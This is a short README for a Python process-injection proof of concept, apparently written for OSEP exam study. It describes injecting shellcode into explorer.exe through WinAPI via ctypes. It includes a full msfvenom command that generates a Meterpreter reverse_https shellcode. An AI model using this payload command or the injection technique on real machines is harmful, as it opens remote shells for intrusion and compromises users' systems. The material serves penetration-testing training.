## Description :
A PoC script for Process Injection through Python. The script utilizes the ``ctypes`` to access WinAPI, and ``psutil`` to get the process id. Make sure these libraries are installed on your machine before running it.

## Shellcode Generation
using ``msfvenom`` :
``msfvenom -p windows/x64/meterpreter/reverse_https LHOST=0.0.0.0 LPORT=443 EXITFUNC=thread -f py``

## Sample Output :
![alt text](https://github.com/0xb1tByte/OSEP-Journey/blob/main/Scripts/ProcessInjection/PoC.png)

## Notes : 
- The script inject the shellcode into ``explorer.exe`` process, you can inject into another process by supplying the process name (check ``55`` line on the script)
- Make sure your shellcode is compatible with the process type (32bit/64bit)
